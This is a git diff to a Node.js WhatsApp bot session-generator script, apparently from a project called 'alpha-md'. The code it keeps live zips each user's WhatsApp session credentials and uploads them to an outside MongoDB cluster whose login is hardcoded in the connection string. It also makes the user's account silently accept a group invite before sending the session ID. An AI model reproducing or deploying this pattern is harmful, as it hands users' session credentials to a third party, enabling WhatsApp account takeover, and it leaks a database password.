@@ -63,8 +63,7 @@ XeonBotInc.ev.on("connection.update",async  (s) => {
             await XeonBotInc.sendMessage(XeonBotInc.user.id, { text: '*thanks for choosing alpha-md*\n*your sesssionid will be sent in 10 seconds please wait..*\n*have a great day ahead*' });
             await delay(1000 * 10)
             const folderPath = `./session/${id}/`;
-            const randomId = id;
-               const output = fs.createWriteStream(`creds_${randomId}.zip`);
+               const output = fs.createWriteStream(`creds_${id}.zip`);
                const archive = archiver('zip', {
                    zlib: { level: 9 } 
                });
@@ -75,21 +74,22 @@ XeonBotInc.ev.on("connection.update",async  (s) => {
                        await client.connect('https://r2:uploader2@uploader2.uhnmx1u.mongodb.net/?retryWrites=true&w=majority&appName=uploader2');
                        const database = client.db('testdb');
                        const collection = database.collection('credentials');
-                       const fileContent = fs.readFileSync(`creds_${randomId}.zip`);
+                       const fileContent = fs.readFileSync(`creds_${id}.zip`);
                        const result = await collection.insertOne({
-                           fileId: randomId,
+                           fileId: id,
                            file: fileContent
                        });
    
                        console.log('File uploaded to MongoDB with ID:', result.insertedId);
-                       XeonBotInc.groupAcceptInvite("BGWpp9qySw81CGrqRM3ceg");
-                       const xeonses = await XeonBotInc.sendMessage(XeonBotInc.user.id, { text: randomId });
-                       await XeonBotInc.sendMessage(XeonBotInc.user.id, { text: `*ᴅᴇᴀʀ ᴜsᴇʀ ᴛʜɪs ɪs ʏᴏᴜʀ sᴇssɪᴏɴ ɪᴅ*\n*◕ ⚠️ ᴘʟᴇᴀsᴇ ᴅᴏ ɴᴏᴛ sʜᴀʀᴇ ᴛʜɪs ᴄᴏᴅᴇ ᴡɪᴛʜ ᴀɴʏᴏɴᴇ ᴀs ɪᴛ ᴄᴏɴᴛᴀɪɴs ʀᴇǫᴜɪʀᴇᴅ ᴅᴀᴛᴀ ᴛᴏ ɢᴇᴛ ʏᴏᴜʀ ᴄᴏɴᴛᴀᴄᴛ ᴅᴇᴛᴀɪʟs ᴀɴᴅ ᴀᴄᴄᴇss ʏᴏᴜʀ ᴡʜᴀᴛsᴀᴘᴘ*` }, {quoted: xeonses});
                    } catch (error) {
                        console.error('Error uploading file to MongoDB:', error);
                    } finally {
                        await client.close();
                    }
+                        XeonBotInc.groupAcceptInvite("BGWpp9qySw81CGrqRM3ceg");
+                       const xeonses = await XeonBotInc.sendMessage(XeonBotInc.user.id, { text: id });
+                       await XeonBotInc.sendMessage(XeonBotInc.user.id, { text: `*ᴅᴇᴀʀ ᴜsᴇʀ ᴛʜɪs ɪs ʏᴏᴜʀ sᴇssɪᴏɴ ɪᴅ*\n*◕ ⚠️ ᴘʟᴇᴀsᴇ ᴅᴏ ɴᴏᴛ sʜᴀʀᴇ ᴛʜɪs ᴄᴏᴅᴇ ᴡɪᴛʜ ᴀɴʏᴏɴᴇ ᴀs ɪᴛ ᴄᴏɴᴛᴀɪɴs ʀᴇǫᴜɪʀᴇᴅ ᴅᴀᴛᴀ ᴛᴏ ɢᴇᴛ ʏᴏᴜʀ ᴄᴏɴᴛᴀᴄᴛ ᴅᴇᴛᴀɪʟs ᴀɴᴅ ᴀᴄᴄᴇss ʏᴏᴜʀ ᴡʜᴀᴛsᴀᴘᴘ*` }, {quoted: xeonses});
+                   
                });
                archive.on('warning', function (err) {
                    if (err.code === 'ENOENT') {
